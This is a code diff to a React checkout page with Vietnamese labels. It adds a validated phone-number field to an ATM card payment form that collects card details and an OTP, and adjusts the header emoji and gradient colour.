@@ -103,7 +103,7 @@ function OtpCountdown({ onExpire }) {
 function AtmCardForm({ total, orderId, onSuccess, onError }) {
   const [step,       setStep]       = useState('card') // card | otp | processing
   const [showNum,    setShowNum]    = useState(false)
-  const [card,       setCard]       = useState({ number: '', holder: '', expiry: '', issued: '' })
+  const [card,       setCard]       = useState({ number: '', holder: '', expiry: '', issued: '', phone: '' })
   const [otp,        setOtp]        = useState(['', '', '', '', '', ''])
   const [otpExpired, setOtpExpired] = useState(false)
   const [formErr,    setFormErr]    = useState('')
@@ -131,6 +131,8 @@ function AtmCardForm({ total, orderId, onSuccess, onError }) {
     if (!card.holder.trim())    return 'Vui lòng nhập tên chủ thẻ'
     if (card.expiry.length !== 5) return 'Ngày hết hạn không hợp lệ (MM/YY)'
     if (card.issued.length !== 10) return 'Ngày phát hành không hợp lệ (DD/MM/YYYY)'
+    if (!card.phone.trim()) return 'Vui lòng nhập số điện thoại'
+    if (!/^\d{10}$/.test(card.phone.replace(/\D/g, ''))) return 'Số điện thoại phải có 10 chữ số'
     return ''
   }
 
@@ -294,6 +296,16 @@ function AtmCardForm({ total, orderId, onSuccess, onError }) {
             autoComplete="cc-name"
           />
         </div>
+        <div>
+          <label className="text-xs text-gray-400 mb-1.5 block">Số điện thoại <span className="text-red-400">*</span></label>
+          <input type="tel" value={card.phone}
+            onChange={e => setCard(c => ({ ...c, phone: e.target.value }))}
+            placeholder="0123456789"
+            className={inputCls}
+            autoComplete="tel"
+            maxLength={11}
+          />
+        </div>
         <div className="grid grid-cols-2 gap-4">
           <div>
             <label className="text-xs text-gray-400 mb-1.5 block">Ngày hết hạn <span className="text-red-400">*</span></label>
@@ -334,6 +346,7 @@ export default function PaymentPage() {
   const method = params.get('method') || 'vietqr'
   const total  = Number(params.get('total') || 0)
   const name   = params.get('name') || ''
+  const phone  = params.get('phone') || ''
 
   const [status,  setStatus]  = useState('pending') // pending | paying | success | error | expired
   const [errMsg,  setErrMsg]  = useState('')
@@ -360,10 +373,10 @@ export default function PaymentPage() {
   }, [isAtm, orderId, momoRetry])
 
   const brand      = isAtm ? 'Thẻ ATM (MoMo)' : 'VietQR'
-  const logo       = isAtm ? '🏧' : '📱'
+  const logo       = isAtm ? '📳' : '📱'
   const qrColor    = 'bg-teal-600'
   const headerCls  = isAtm
-    ? 'bg-gradient-to-r from-pink-700 to-pink-900'
+    ? 'bg-gradient-to-r from-pink-600 to-pink-900'
     : 'bg-gradient-to-r from-teal-700 to-cyan-900'
 
   const handleConfirm = useCallback(async () => {
